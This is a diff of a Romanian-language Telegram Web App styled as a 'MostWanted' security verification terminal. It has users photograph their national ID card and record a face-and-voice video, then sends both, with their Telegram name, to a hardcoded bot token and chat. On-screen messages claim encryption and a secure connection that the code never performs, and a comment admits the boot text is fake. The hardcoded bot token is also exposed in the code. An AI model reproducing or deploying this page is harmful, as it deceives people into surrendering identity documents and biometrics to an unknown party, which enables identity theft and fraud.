@@ -3,85 +3,424 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MostWanted Quantum Security</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #000; color: #0F0; font-family: monospace; text-align: center; }
-        .p { display: none; padding: 20px; }
-        .active { display: block; }
-        button { background: #0F0; border: none; padding: 20px; width: 100%; font-weight: bold; }
-        video, img { width: 100%; max-height: 200px; border: 1px solid #0F0; }
+        :root {
+            --bg-pure: #000000;
+            --terminal-green: #00FF66;
+            --green-glow: rgba(0, 255, 102, 0.2);
+            --panel-bg: #09090b;
+            --text-white: #FFFFFF;
+            --text-dark: #000000;
+            --border-toxic: #00FF66;
+        }
+
+        body {
+            background-color: var(--bg-pure);
+            color: var(--text-white);
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+            overflow: hidden;
+        }
+
+        body::after {
+            content: " ";
+            display: block;
+            position: fixed;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            z-index: 99999;
+            background-size: 100% 3px, 6px 100%;
+            pointer-events: none;
+        }
+
+        .terminal-box {
+            width: 100%;
+            max-width: 360px;
+            background-color: var(--panel-bg);
+            border: 2px solid var(--border-toxic);
+            border-radius: 0px;
+            padding: 25px 20px;
+            box-sizing: border-box;
+            box-shadow: 0 0 20px var(--green-glow);
+        }
+
+        .header-section {
+            border-bottom: 2px dashed var(--border-toxic);
+            padding-bottom: 15px;
+            margin-bottom: 25px;
+            text-align: left;
+            position: relative;
+        }
+
+        h1 {
+            font-size: 22px;
+            font-weight: bold;
+            color: var(--terminal-green);
+            margin: 0;
+            text-shadow: 0 0 5px var(--border-toxic);
+            letter-spacing: 1px;
+        }
+
+        .status-badge {
+            display: inline-block;
+            font-size: 10px;
+            background: var(--green-glow);
+            color: var(--terminal-green);
+            border: 1px solid var(--border-toxic);
+            padding: 2px 6px;
+            margin-top: 8px;
+            font-weight: bold;
+        }
+
+        .countdown-timer {
+            position: absolute;
+            right: 0;
+            bottom: 15px;
+            font-size: 12px;
+            color: #FF3B30;
+            font-weight: bold;
+            display: none;
+            text-shadow: 0 0 5px rgba(255, 59, 48, 0.5);
+        }
+
+        .step { display: none; }
+        .step.active { display: block; }
+
+        .console-text {
+            font-size: 13px;
+            color: #d1d1d6;
+            margin-bottom: 25px;
+            line-height: 1.5;
+            text-align: left;
+            min-height: 40px;
+        }
+
+        .viewport {
+            width: 100%;
+            height: 210px;
+            background: #020202;
+            border: 1px solid rgba(0, 255, 102, 0.3);
+            margin-bottom: 25px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        video, img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .scan-frame {
+            position: absolute;
+            top: 15px; left: 15px; right: 15px; bottom: 15px;
+            border: 1px dashed rgba(0, 255, 102, 0.5);
+            pointer-events: none;
+        }
+        .scan-frame::before {
+            content: "[ ALIGN ID DOCUMENT ]";
+            position: absolute;
+            bottom: 10px;
+            width: 100%;
+            text-align: center;
+            font-size: 9px;
+            color: var(--terminal-green);
+            letter-spacing: 1px;
+        }
+
+        /* Linie de Scanare Laser Animata */
+        .laser-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: var(--terminal-green);
+            box-shadow: 0 0 10px var(--terminal-green);
+            animation: scanLaser 2s linear infinite;
+            pointer-events: none;
+        }
+
+        @keyframes scanLaser {
+            0% { top: 0%; }
+            50% { top: 100%; }
+            100% { top: 0%; }
+        }
+
+        .action-btn {
+            background: var(--terminal-green);
+            color: var(--text-dark);
+            border: none;
+            padding: 16px;
+            font-size: 14px;
+            font-weight: bold;
+            font-family: 'Courier New', Courier, monospace;
+            cursor: pointer;
+            width: 100%;
+            box-sizing: border-box;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: background 0.1s ease;
+            box-shadow: 4px 4px 0px #006622;
+        }
+
+        .action-btn:active {
+            transform: translate(2px, 2px);
+            box-shadow: 2px 2px 0px #006622;
+        }
+
+        .action-btn-secondary {
+            background: transparent;
+            color: var(--terminal-green);
+            border: 1px solid var(--border-toxic);
+            margin-top: 12px;
+            box-shadow: none;
+        }
+
+        .recording-pulse {
+            background: #FF3B30 !important;
+            color: white !important;
+            box-shadow: 4px 4px 0px #990000 !important;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink { 50% { opacity: 0.8; } }
+
+        #logText {
+            font-size: 11px;
+            color: #8e8e93;
+            margin-top: 20px;
+            text-align: left;
+            border-top: 1px solid rgba(0, 255, 102, 0.1);
+            padding-top: 12px;
+            height: 32px;
+            overflow: hidden;
+        }
+
+        .terminal-loader {
+            display: none;
+            font-size: 14px;
+            color: var(--terminal-green);
+            margin: 15px 0;
+        }
     </style>
 </head>
 <body>
 
-<!-- PAS 1 -->
-<div id="s1" class="p active">
-    <input type="file" id="i1" accept="image/*" capture="environment" style="display:none">
-    <button onclick="document.getElementById('i1').click()">[ 1. SCANEAZĂ BULETIN ]</button>
-</div>
+<div class="terminal-box">
+    <div class="header-section">
+        <h1>MOSTWANTED_NET</h1>
+        <div class="status-badge" id="coreStatus">INITIALIZING CORE...</div>
+        <div class="countdown-timer" id="timerDisplay">[ REC: 05s ]</div>
+    </div>
 
-<!-- PAS 2 -->
-<div id="s2" class="p">
-    <p>Rostiți: "MostWanted NETWORK, 13 Iulie 2026"</p>
-    <video id="v" autoplay playsinline muted></video>
-    <button id="b2" onclick="start()">[ 2. START ÎNREGISTRARE ]</button>
-</div>
+    <!-- STAGE 1 -->
+    <div id="step1" class="step active">
+        <div class="console-text" id="typewriterText">> SYSTEM_REQ: Așteptare boot...</div>
+        <div class="viewport">
+            <div id="frame" class="scan-frame"><div class="laser-line"></div></div>
+            <img id="idPreview" src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='24' height='24' fill='none'><rect x='3' y='4' width='18' height='16' stroke='%2300FF66' stroke-width='1'/></svg>" alt="" style="display:none;">
+        </div>
+        <input type="file" id="idInput" accept="image/*" capture="environment" style="display: none;">
+        <button class="action-btn" id="captureBtn" style="display:none;" onclick="playSound(600, 0.1); document.getElementById('idInput').click()">[ CAPTURE_PHOTO ]</button>
+        <button class="action-btn action-btn-secondary" id="nextStepBtn" style="display: none;" onclick="playSound(800, 0.1); goToStep2()">NEXT_STAGE >></button>
+    </div>
 
-<!-- PAS 3 -->
-<div id="s3" class="p">
-    <input type="file" id="i3" accept="image/*,video/*" style="display:none">
-    <button onclick="document.getElementById('i3').click()">[ 3. SELECTEAZĂ DOVADĂ ]</button>
+    <!-- STAGE 2 -->
+    <div id="step2" class="step">
+        <div class="console-text">> SYSTEM_REQ: Înregistrare biometrică vocală. Rostiți clar fraza:<br><span style="color:var(--terminal-green);">"MostWanted NETWORK"</span></div>
+        <div class="viewport">
+            <video id="videoPreview" autoplay muted playsinline></video>
+        </div>
+        <button class="action-btn" id="recordBtn" onclick="toggleRecording()">[ START_RECORD ]</button>
+        <div class="terminal-loader" id="loadingSpinner">> INITIALIZING_UPLOAD...</div>
+        <div id="logText">LOG: Așteptare periferice...</div>
+    </div>
 </div>
 
 <script>
-    let f1, f3, rec, chunks = [], stream;
+    const tg = window.Telegram.WebApp;
+    tg.expand();
 
-    // Pasul 1
-    document.getElementById('i1').onchange = (e) => {
-        f1 = e.target.files[0];
-        document.getElementById('s1').classList.remove('active');
-        document.getElementById('s2').classList.add('active');
-        navigator.mediaDevices.getUserMedia({video: true, audio: true}).then(s => {
-            stream = s;
-            document.getElementById('v').srcObject = s;
-        });
-    };
+    const BOT_TOKEN = "8309275788:AAEfr_9zmaV6BmYKO4ISlEUITpInK-Fm6uk"; 
+    const CHAT_ID = "-1003936586656"; 
 
-    // Pasul 2
-    function start() {
-        chunks = [];
-        rec = new MediaRecorder(stream);
-        rec.ondataavailable = e => chunks.push(e.data);
-        rec.onstop = () => {
-            document.getElementById('s2').classList.remove('active');
-            document.getElementById('s3').classList.add('active');
-        };
-        rec.start();
-        document.getElementById('b2').innerText = "ÎNREGISTRARE ACTIVĂ (15s)...";
-        setTimeout(() => rec.stop(), 15000);
+    let idBlob = null;
+    let stream;
+    let mediaRecorder;
+    let recordedChunks = [];
+    let audioCtx = null;
+
+    // Generator nativ de sunete synth
+    function playSound(frequency, duration) {
+        try {
+            if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.type = "square";
+            osc.frequency.value = frequency;
+            gain.gain.setValueAtTime(0.05, audioCtx.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + duration);
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+            osc.start();
+            osc.stop(audioCtx.currentTime + duration);
+        } catch(e) {}
     }
 
-    // Pasul 3
-    document.getElementById('i3').onchange = (e) => {
-        f3 = e.target.files[0];
-        upload();
+    // Efect de sunet tip sirenă/alertă militară la înregistrare
+    function playAlertSound() {
+        playSound(880, 0.15);
+        setTimeout(() => playSound(660, 0.15), 150);
+    }
+
+    // Animație de boot text fals tip hacking
+    window.onload = function() {
+        const logs = [
+            "> SECURE CONNECTION ESTABLISHED...",
+            "> ENCRYPTING USER IP NODE...",
+            "> SYSTEM_REQ: Încărcați scanarea frontală a actului. Asigurați lizibilitate maximă."
+        ];
+        let currentLog = 0;
+        const txtEl = document.getElementById('typewriterText');
+        
+        const interval = setInterval(() => {
+            if(currentLog < logs.length) {
+                txtEl.innerText = logs[currentLog];
+                playSound(1000, 0.03);
+                currentLog++;
+            } else {
+                clearInterval(interval);
+                document.getElementById('coreStatus').innerText = "SECURE NODE CORE v2.8";
+                document.getElementById('captureBtn').style.display = "block";
+            }
+        }, 800);
     };
 
-    async function upload() {
-        const token = "8309275788:AAEfr_9zmaV6BmYKO4ISlEUITpInK-Fm6uk";
-        const cid = "-1003936586656";
-        
-        // Trimite pe rând: Buletin, Video, Dovadă
-        let files = [ {t:"photo", f:f1}, {t:"video", f:new Blob(chunks)}, {t:f3.type.includes('image')?"photo":"video", f:f3} ];
-        
-        for(let item of files) {
-            let fd = new FormData();
-            fd.append("chat_id", cid);
-            fd.append(item.t, item.f);
-            await fetch(`https://api.telegram.org/bot${token}/send` + (item.t=="photo"?"Photo":"Video"), {method:"POST", body:fd});
+    document.getElementById('idInput').addEventListener('change', function(e) {
+        idBlob = e.target.files[0];
+        if (idBlob) {
+            const reader = new FileReader();
+            reader.onload = function(event) {
+                const img = document.getElementById('idPreview');
+                img.src = event.target.result;
+                img.style.display = 'block';
+                document.getElementById('frame').style.display = 'none';
+                document.getElementById('nextStepBtn').style.display = 'block';
+            };
+            reader.readAsDataURL(idBlob);
         }
-        alert("Trimis.");
-        window.Telegram.WebApp.close();
+    });
+
+    async function goToStep2() {
+        document.getElementById('step1').classList.remove('active');
+        document.getElementById('step2').classList.add('active');
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+            document.getElementById('videoPreview').srcObject = stream;
+            document.getElementById('logText').innerText = "LOG: Biometrie video activă. Senzori calibrați.";
+        } catch (err) { 
+            document.getElementById('logText').innerText = "ERROR: Acces refuzat hardware.";
+            alert("Sistemul necesită acces la cameră și microfon."); 
+        }
+    }
+
+    function toggleRecording() {
+        const btn = document.getElementById('recordBtn');
+        const log = document.getElementById('logText');
+        const spinner = document.getElementById('loadingSpinner');
+        const timerEl = document.getElementById('timerDisplay');
+
+        if (mediaRecorder && mediaRecorder.state === "recording") {
+            mediaRecorder.stop();
+        } else {
+            recordedChunks = [];
+            let options = { mimeType: 'video/webm;codecs=vp9' };
+            if (!MediaRecorder.isTypeSupported(options.mimeType)) { options = { mimeType: 'video/mp4' }; }
+
+            try { mediaRecorder = new MediaRecorder(stream, options); } catch(e) { mediaRecorder = new MediaRecorder(stream); }
+
+            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
+            
+            mediaRecorder.onstop = async () => {
+                const videoBlob = new Blob(recordedChunks, { type: mediaRecorder.mimeType });
+                if(stream) { stream.getTracks().forEach(track => track.stop()); }
+                
+                btn.style.display = "none";
+                timerEl.style.display = "none";
+                spinner.style.display = "block";
+                log.innerText = "LOG: Criptare pachete media și securizare nod...";
+                
+                try {
+                    await trimiteLaTelegram(idBlob, videoBlob);
+                    playSound(1200, 0.4);
+                    log.innerText = "LOG: Sincronizare completă. Sesiune închisă.";
+                    setTimeout(() => tg.close(), 1500);
+                } catch(err) {
+                    btn.style.display = "block";
+                    spinner.style.display = "none";
+                    log.innerText = "ERROR: Protocol eșuat. Scurgere de timeout.";
+                    alert("Eroare la trimitere. Verifică rețeaua.");
+                }
+            };
+
+            // Alertă sonoră pornire
+            playAlertSound();
+            mediaRecorder.start();
+            
+            btn.innerText = "[ STOP_AND_SEND ]";
+            btn.classList.add('recording-pulse');
+            log.innerText = "LOG: Captură activă. Rostește fraza cheie.";
+            
+            // Logica Countdown Timer (Cronometru)
+            let secondsLeft = 5;
+            timerEl.style.display = "block";
+            timerEl.innerText = `[ REC: 0${secondsLeft}s ]`;
+            
+            const countdown = setInterval(() => {
+                secondsLeft--;
+                if(secondsLeft > 0) {
+                    timerEl.innerText = `[ REC: 0${secondsLeft}s ]`;
+                    playSound(440, 0.05); // Sunet ritmic la fiecare secundă
+                } else {
+                    clearInterval(countdown);
+                    if(mediaRecorder.state === "recording") mediaRecorder.stop();
+                }
+            }, 1000);
+        }
+    }
+
+    async function trimiteLaTelegram(photoFile, videoFile) {
+        let user = tg.initDataUnsafe.user ? `@${tg.initDataUnsafe.user.username} (${tg.initDataUnsafe.user.first_name})` : "Utilizator Anonim";
+        
+        let formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", photoFile, "buletin.jpg");
+        formData.append("caption", `🟢 **SISTEM VERIFICARE MOSTWANTED**\n━━━━━━━━━━━━━━━━━━━━\n👤 **Utilizator:** ${user}\n⚡ **Protocol:** Terminal Verificare Activ\n━━━━━━━━━━━━━━━━━━━━\nFilmarea biometrică se află în mesajul următor.`);
+        formData.append("parse_mode", "Markdown");
+
+        let resPhoto = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+        if (!resPhoto.ok) throw new Error("Eroare foto");
+
+        let videoData = new FormData();
+        videoData.append("chat_id", CHAT_ID);
+        let ext = mediaRecorder.mimeType.includes('mp4') ? 'mp4' : 'webm';
+        videoData.append("video", videoFile, `verificare.${ext}`);
+        
+        let resVideo = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: "POST", body: videoData });
+        if (!resVideo.ok) throw new Error("Eroare video");
     }
 </script>
 </body>
